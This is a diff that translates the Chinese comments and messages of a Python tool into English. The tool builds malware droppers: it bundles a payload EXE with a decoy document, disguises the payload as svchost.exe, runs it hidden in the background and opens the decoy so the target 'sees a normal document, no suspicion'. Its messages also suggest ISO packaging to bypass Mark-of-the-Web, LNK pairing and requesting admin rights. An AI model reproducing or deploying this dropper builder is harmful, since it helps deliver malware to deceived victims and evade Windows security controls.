@@ -9,8 +9,8 @@ from config import OUTPUT_DIR
 
 def generate_stub_script(payload_path, decoy_path, payload_run_name="svchost.exe"):
     """
-    生成 stub Python 脚本
-    这个脚本被 PyInstaller 编译后就是最终的捆绑 EXE
+    Generate a stub Python script.
+    This script, compiled by PyInstaller, becomes the final bundled EXE.
     """
     with open(payload_path, 'rb') as f:
         payload_b64 = base64.b64encode(f.read()).decode()
@@ -31,19 +31,19 @@ import threading
 def main():
     temp_dir = tempfile.mkdtemp()
 
-    # 释放 payload
+    # Extract payload
     payload_data = base64.b64decode("{payload_b64}")
     payload_path = os.path.join(temp_dir, "{payload_run_name}")
     with open(payload_path, "wb") as f:
         f.write(payload_data)
 
-    # 释放诱饵文档
+    # Extract decoy document
     decoy_data = base64.b64decode("{decoy_b64}")
     decoy_path = os.path.join(temp_dir, "{decoy_run_name}")
     with open(decoy_path, "wb") as f:
         f.write(decoy_data)
 
-    # 后台启动 payload（隐藏窗口）
+    # Launch payload in background (hidden window)
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
     startupinfo.wShowWindow = 0  # SW_HIDE
@@ -57,7 +57,7 @@ def main():
     except Exception:
         pass
 
-    # 前台打开诱饵文档
+    # Open decoy document in foreground
     try:
         os.startfile(decoy_path)
     except Exception:
@@ -74,25 +74,25 @@ def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
                          payload_run_name="svchost.exe", icon_path=None,
                          one_file=True):
     """
-    生成捆绑 EXE 文件
+    Generate a bundled EXE file.
 
-    参数:
-        payload_path: 原始 payload EXE 路径
-        decoy_path: 诱饵文档路径
-        output_filename: 输出 EXE 文件名
-        payload_run_name: payload 释放后的进程名（伪装）
-        icon_path: 可选：EXE 图标文件（.ico）
-        one_file: True=单文件模式 False=目录模式
+    Args:
+        payload_path: path to the original payload EXE
+        decoy_path: path to the decoy document
+        output_filename: output EXE filename
+        payload_run_name: process name after payload extraction (disguise)
+        icon_path: optional EXE icon file (.ico)
+        one_file: True=single file mode, False=directory mode
 
-    返回: (success: bool, message: str)
+    Returns: (success: bool, message: str)
     """
     try:
         if not os.path.exists(payload_path):
-            return False, f"Payload 文件不存在: {payload_path}"
+            return False, f"Payload file not found: {payload_path}"
         if not os.path.exists(decoy_path):
-            return False, f"诱饵文件不存在: {decoy_path}"
+            return False, f"Decoy file not found: {decoy_path}"
 
-        # 检查 PyInstaller 是否可用
+        # Check PyInstaller availability
         pyinstaller_path = shutil.which('pyinstaller')
         if not pyinstaller_path:
             try:
@@ -102,14 +102,14 @@ def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
                 )
                 if result.returncode != 0:
                     return False, (
-                        "未找到 PyInstaller，请先安装：\n"
+                        "PyInstaller not found. Please install first:\n"
                         "pip install pyinstaller\n\n"
-                        "安装后重新点击生成"
+                        "After installation, click Generate again."
                     )
                 pyinstaller_cmd = [sys.executable, '-m', 'PyInstaller']
             except Exception:
                 return False, (
-                    "未找到 PyInstaller，请先安装：\n"
+                    "PyInstaller not found. Please install first:\n"
                     "pip install pyinstaller"
                 )
         else:
@@ -118,13 +118,13 @@ def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
         work_dir = tempfile.mkdtemp(prefix="binder_build_")
 
         try:
-            # 1. 生成 stub 脚本
+            # 1. Generate stub script
             stub_code = generate_stub_script(payload_path, decoy_path, payload_run_name)
             stub_path = os.path.join(work_dir, "stub.py")
             with open(stub_path, 'w', encoding='utf-8') as f:
                 f.write(stub_code)
 
-            # 2. 构建 PyInstaller 命令
+            # 2. Build PyInstaller command
             output_name = os.path.splitext(output_filename)[0]
 
             cmd = pyinstaller_cmd + [
@@ -145,13 +145,13 @@ def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
 
             cmd.append(stub_path)
 
-            # 3. 执行 PyInstaller
+            # 3. Execute PyInstaller
             result = subprocess.run(
                 cmd, capture_output=True, text=True,
                 timeout=120, cwd=work_dir
             )
 
-            # 4. 检查输出
+            # 4. Check output
             if one_file:
                 expected_output = os.path.join(OUTPUT_DIR, f"{output_name}.exe")
             else:
@@ -168,24 +168,24 @@ def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
                 decoy_size = os.path.getsize(decoy_path)
 
                 return True, (
-                    f"捆绑 EXE 已生成: {expected_output}\n"
-                    f"文件大小: {size_str}\n\n"
-                    f"内嵌文件:\n"
+                    f"Bundled EXE generated: {expected_output}\n"
+                    f"File size: {size_str}\n\n"
+                    f"Embedded files:\n"
                     f"  Payload: {os.path.basename(payload_path)} ({payload_size/1024:.1f} KB)\n"
-                    f"    → 释放为: %TEMP%\\xxx\\{payload_run_name}\n"
-                    f"  诱饵: {os.path.basename(decoy_path)} ({decoy_size/1024:.1f} KB)\n"
-                    f"    → 释放后自动打开\n\n"
-                    f"目标双击此 EXE 后:\n"
-                    f"1. 后台静默运行 {payload_run_name}（不弹窗）\n"
-                    f"2. 前台自动打开 {os.path.basename(decoy_path)}\n"
-                    f"3. 目标看到正常文档打开，不会起疑\n\n"
-                    f"提示:\n"
-                    f"• 可配合 LNK 模块使用\n"
-                    f"• 可打包进 ISO 绕过 MOTW"
+                    f"    -> Extracted as: %TEMP%\\xxx\\{payload_run_name}\n"
+                    f"  Decoy: {os.path.basename(decoy_path)} ({decoy_size/1024:.1f} KB)\n"
+                    f"    -> Auto-opened after extraction\n\n"
+                    f"When the target double-clicks this EXE:\n"
+                    f"1. {payload_run_name} runs silently in the background (no window)\n"
+                    f"2. {os.path.basename(decoy_path)} opens in the foreground\n"
+                    f"3. Target sees a normal document, no suspicion\n\n"
+                    f"Tips:\n"
+                    f"• Can be combined with the LNK module\n"
+                    f"• Package into ISO to bypass MOTW"
                 )
             else:
                 error_msg = result.stderr if result.stderr else result.stdout
-                return False, f"PyInstaller 编译失败:\n{error_msg[-500:]}"
+                return False, f"PyInstaller build failed:\n{error_msg[-500:]}"
 
         finally:
             try:
@@ -194,22 +194,22 @@ def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
                 pass
 
     except subprocess.TimeoutExpired:
-        return False, "PyInstaller 编译超时（120秒），请检查文件大小"
+        return False, "PyInstaller build timed out (120s). Check file size."
     except Exception as e:
-        return False, f"生成捆绑 EXE 失败: {str(e)}"
+        return False, f"Failed to generate bundled EXE: {str(e)}"
 
 
 def generate_stub_only(payload_path, decoy_path, output_filename="stub.py",
                         payload_run_name="svchost.exe"):
     """
-    仅生成 stub Python 脚本（不编译为 EXE）
-    用户可自行用 PyInstaller 编译
+    Generate only the stub Python script (without compiling to EXE).
+    Users can compile it themselves with PyInstaller.
     """
     try:
         if not os.path.exists(payload_path):
-            return False, f"Payload 文件不存在: {payload_path}"
+            return False, f"Payload file not found: {payload_path}"
         if not os.path.exists(decoy_path):
-            return False, f"诱饵文件不存在: {decoy_path}"
+            return False, f"Decoy file not found: {decoy_path}"
 
         stub_code = generate_stub_script(payload_path, decoy_path, payload_run_name)
 
@@ -218,14 +218,14 @@ def generate_stub_only(payload_path, decoy_path, output_filename="stub.py",
             f.write(stub_code)
 
         return True, (
-            f"Stub 脚本已生成: {output_path}\n\n"
-            f"手动编译命令:\n"
+            f"Stub script generated: {output_path}\n\n"
+            f"Manual build command:\n"
             f"pyinstaller --onefile --noconsole --name output {output_path}\n\n"
-            f"可选参数:\n"
-            f"  --icon app.ico    添加自定义图标\n"
-            f"  --uac-admin       请求管理员权限\n"
-            f"  --key YOUR_KEY    加密 Python 字节码\n\n"
-            f"编译完成后 EXE 在 dist/ 目录中"
+            f"Optional arguments:\n"
+            f"  --icon app.ico    Add custom icon\n"
+            f"  --uac-admin       Request admin privileges\n"
+            f"  --key YOUR_KEY    Encrypt Python bytecode\n\n"
+            f"After build, the EXE will be in the dist/ directory."
         )
     except Exception as e:
-        return False, f"生成 Stub 脚本失败: {str(e)}"
+        return False, f"Failed to generate stub script: {str(e)}"
